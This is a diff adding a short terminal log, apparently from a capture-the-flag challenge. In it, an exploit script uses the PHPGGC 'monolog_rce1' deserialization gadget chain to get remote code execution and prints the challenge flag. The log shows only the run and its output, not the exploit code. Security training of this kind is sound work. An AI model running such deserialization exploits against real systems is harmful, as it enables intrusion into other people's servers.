@@ -1,0 +1,12 @@
+➜  25 git:(master) ✗ ./exploit.py
+[*] Try to use monolog_rce1 for exploitation.
+[i] PHPGGC not found. Cloning it
+Cloning into 'phpggc'...
+remote: Enumerating objects: 2598, done.
+remote: Counting objects: 100% (940/940), done.
+remote: Compressing objects: 100% (528/528), done.
+remote: Total 2598 (delta 379), reused 822 (delta 287), pack-reused 1658
+Receiving objects: 100% (2598/2598), 390.29 KiB | 2.91 MiB/s, done.
+Resolving deltas: 100% (1021/1021), done.
+[*] Result:
+TOAD{phR0m-L4R4v3l-70-R007-C0n9R472}
